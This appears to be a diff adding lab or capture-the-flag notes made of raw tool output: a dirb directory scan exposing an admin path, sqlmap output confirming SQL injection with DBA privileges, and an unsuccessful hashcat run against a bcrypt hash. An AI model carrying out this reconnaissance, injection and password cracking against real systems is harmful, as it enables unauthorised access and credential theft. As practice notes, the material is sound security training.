@@ -1,0 +1,79 @@
+DIRB RESULT :
+
+---- Scanning URL: http://178.62.70.150:31304/ ----
+==> DIRECTORY: http://178.62.70.150:31304/administrat/                                                           
+==> DIRECTORY: http://178.62.70.150:31304/css/                                                                   
++ http://178.62.70.150:31304/favicon.ico (CODE:200|SIZE:32038)                                                   
+==> DIRECTORY: http://178.62.70.150:31304/img/                                                                   
++ http://178.62.70.150:31304/index.php (CODE:200|SIZE:9541)                                                      
+==> DIRECTORY: http://178.62.70.150:31304/js/                                                                    
+==> DIRECTORY: http://178.62.70.150:31304/mail/                                                                  
++ http://178.62.70.150:31304/robots.txt (CODE:200|SIZE:0)                                                        
++ http://178.62.70.150:31304/server-status (CODE:403|SIZE:304)                                                   
+==> DIRECTORY: http://178.62.70.150:31304/vendor/                                                                
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/administrat/ ----
+==> DIRECTORY: http://178.62.70.150:31304/administrat/include/                                                   
++ http://178.62.70.150:31304/administrat/index.php (CODE:200|SIZE:1213)                                          
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/mail/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/vendor/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                 
+---- Entering directory: http://178.62.70.150:31304/administrat/include/ ----
++ http://178.62.70.150:31304/administrat/include/index.html (CODE:200|SIZE:0)  
+
+SQLMAP RESULT :
+
+23:40:56] [INFO] fetching current user
+current user: 'db_user@%'
+[23:40:56] [INFO] fetching current database
+current database: 'freelancer'
+[23:40:56] [INFO] fetching server hostname
+hostname: 'freelancer-472600-546b87db9b-mk4p6'
+[23:40:56] [INFO] testing if current user is DBA
+[23:40:56] [INFO] fetching current user
+current user is DBA: True
+[23:40:56] [INFO] fetching database users
+database management system users [2]:
+[*] 'db_user'@'%'
+[*] 'root'@'localhost'
+
+HASHCAT RESULT
+
+Approaching final keyspace - workload adjusted.  
+
+Session..........: hashcat                       
+Status...........: Exhausted
+Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp6...XNRf4K
+Time.Started.....: Thu Apr 22 00:12:46 2021, (30 mins, 4 secs)
+Time.Estimated...: Thu Apr 22 00:42:50 2021, (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       25 H/s (6.38ms) @ Accel:2 Loops:64 Thr:1 Vec:8
+Recovered........: 0/1 (0.00%) Digests
+Progress.........: 139258/139258 (100.00%)
+Rejected.........: 82265/139258 (59.07%)
+Restore.Point....: 139258/139258 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
+Candidates.#1....: $HEX[528c10fa34f45e6ff89f10528fe42986b8dbd02d04f16c51ff177bea767b414398bab7d1ea9800d8a926] -> $HEX[528c10fa34f45e6ff89f10528fe42986b8dbd02d04f16c51ff177bea767b414398bab7d1ea9800d8a926]
+
+Started: Thu Apr 22 00:12:45 2021
+Stopped: Thu Apr 22 00:42:57 2021
